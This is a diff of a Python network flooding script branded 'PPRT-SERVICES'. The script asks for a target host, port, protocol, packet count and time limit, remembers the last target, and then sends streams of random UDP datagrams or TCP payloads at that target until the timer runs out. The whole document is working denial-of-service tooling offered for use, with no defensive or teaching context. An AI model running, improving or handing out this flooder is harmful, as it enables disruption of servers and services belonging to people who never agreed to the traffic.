@@ -5,7 +5,6 @@ import random
 import threading
 import sys
 import os
-from os import system, name
 
 ascii_art = """
  -----------------------------------------------------------------------------------
@@ -21,89 +20,103 @@ ascii_art = """
 """
 print(ascii_art)
 
-print("\033[1;32;40m ==> BY PPRT-SERVICES <==  \n")
-test = input()
-if test == "n":
-	exit(0)
-ip = str(input(" Host/Ip:"))
-port = int(input(" Port:"))
-choice = str(input(" UDP(y/n):"))
-times = int(input(" Packets per one connection:"))
-threads = int(input(" Threads:"))
+print("\033[1;33;40m MAKE BY [PPRT~] | discord.gg/pprtservices\n")
+
+input("Press Enter to start...")
+def save_last_command(ip, port, choice, times, threads):
+    with open("last_command.txt", "w") as file:
+        file.write(f"{ip}\n{port}\n{choice}\n{times}\n{threads}")
+
+def load_last_command():
+    try:
+        with open("last_command.txt", "r") as file:
+            lines = file.readlines()
+            ip = lines[0].strip()
+            port = int(lines[1].strip())
+            choice = lines[2].strip()
+            times = int(lines[3].strip())
+            threads = int(lines[4].strip())
+            return ip, port, choice, times, threads
+    except FileNotFoundError:
+        return None
+
+last_command = load_last_command()
+
+if last_command:
+    ip, port, choice, times, threads = last_command
+    print(f"Último comando executado: ip={ip}, port={port}, choice={choice}, times={times}, threads={threads}")
+    use_last_command = input("Deseja usar o último comando? (y/n): ")
+    if use_last_command.lower() == "n":
+        ip = str(input(" Host/Ip:"))
+        port = int(input(" Porta:"))
+        choice = str(input(" UDP(y/n):"))
+        times = int(input(" Pacotes em uma conexão:"))
+        threads = int(input(" Threads:"))
+    save_last_command(ip, port, choice, times, threads)
+else:
+    ip = str(input(" Host/Ip:"))
+    port = int(input(" Porta:"))
+    choice = str(input(" UDP(y/n):"))
+    times = int(input(" Pacotes em uma conexão:"))
+    threads = int(input(" Threads:"))
+    save_last_command(ip, port, choice, times, threads)
+
+timeout_seconds = int(input(" Tempo limite de execução (em segundos):"))
+
+def run_udp():
+    data = random._urandom(1024)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    start_time = time.time()
+    while time.time() - start_time < timeout_seconds:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip), int(port))
+            for x in range(times):
+                s.sendto(data, addr)
+            print(i + " ENVIANDO PACOTES UDP POR [PPRT~ SERVICES]!!!")
+        except Exception as e:
+            print("[!] Error:", str(e))
+        finally:
+            s.close()
+
+def run_tcp():
+    data = random._urandom(16)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    start_time = time.time()
+    while time.time() - start_time < timeout_seconds:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i + " ENVIANDO PACOTES TCP POR [PPRT~ SERVICES]!!!")
+        except Exception as e:
+            print("[*] Error:", str(e))
+        finally:
+            s.close()
+
 def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"UDP Sent!!!")
-		except:
-			s.close()
-			print("[!] Error!!!")
-
-def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"TCP Sent!!!")
-		except:
-			s.close()
-			print("[*] Error")
-
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
-
-def new():
-	for y in range(threads):
-		if choice == 'y':
-			th = threading.Thread(target = run)
-			th.start()
-		else:
-			th = threading.Thread(target = run2)
-			th.start()
-
-def whereuwere():
-    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
-    print("Put 1 for UDP and 2 for TCP")
-    whereman = str(input(" 1 or 2 >:("))
-    if whereman == '1':
-        run()
+    if choice.lower() == 'y':
+        run_udp()
     else:
-        run2()
+        run_tcp()
 
 def clear():
-    if name == 'nt':
-        _ = system('cls')
-    else:
-        _ = system('clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def byebye():
-	clear()
-	os.system("figlet Youre Leaving Sir -f slant")
-	sys.exit(130)
+    clear()
+    os.system("figlet Youre Leaving Sir -f slant")
+    sys.exit(130)
 
 def exit_gracefully(signum, frame):
     # restore the original signal handler
     signal.signal(signal.SIGINT, original_sigint)
 
     try:
-        exitc = str(input(" You wanna exit bby <3 ?:"))
-        if exitc == 'y':
-
+        exitc = str(input(" Você quer sair <3 ?:"))
+        if exitc.lower() == 'y':
             byebye()
 
     except KeyboardInterrupt:
@@ -117,3 +130,5 @@ if __name__ == '__main__':
     # store SIGINT handler
     original_sigint = signal.getsignal(signal.SIGINT)
     signal.signal(signal.SIGINT, exit_gracefully)
+
+    run()
